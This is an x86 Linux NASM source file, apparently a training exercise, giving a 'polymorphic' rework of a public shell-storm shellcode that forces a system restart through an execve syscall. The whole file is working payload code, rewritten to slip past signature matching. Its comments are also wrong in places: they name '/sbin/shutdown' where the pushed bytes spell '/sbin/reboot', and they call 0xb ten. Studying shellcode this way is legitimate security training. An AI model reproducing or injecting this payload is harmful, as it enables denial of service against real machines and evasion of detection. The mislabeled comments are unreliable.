; Filename: poly_shutdown.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Polymorphic version of shutdown shellcode from shell-storm
; 	    www.shell-storm.org/shellcode/files/shellcode-831.php
; Shellcode : 

global _start			

section .text
_start:

;int execve(const char *filename, char *const argv[],char *const envp[]);

xor edx, edx   ; clearing the edx register
push edx       ; push edx to stack (0)

mov eax, 0x746f6f62        ; move /sbin/shutdown to eax and push eax bit by bit
push eax
mov eax, 0x65722f6e
push eax
mov eax, 0x6962732f
push eax
mov ebx, esp   ; stack pointer to ebx pointing to /sbin/shutdown
push edx       ; push edx to stack (0)

push 0x662d    ; pushw - push '-f' to stack
mov ecx, esp   ; move stack pointer to esi pointing to -f on the stack
push edx       ; push edx to stack (0)
push ecx       ; push ecx to stack, pointer to -f
push ebx       ; push ebx, /sbin/shutdown
mov ecx, esp   ; put stack pointer into ecx for struct parameter

mul edx	       ; edx (0) * ax, clearing eax register
mov al, 0xb    ; move 10 to eax for the execve syscall
int 0x80       ; interupt to syscall
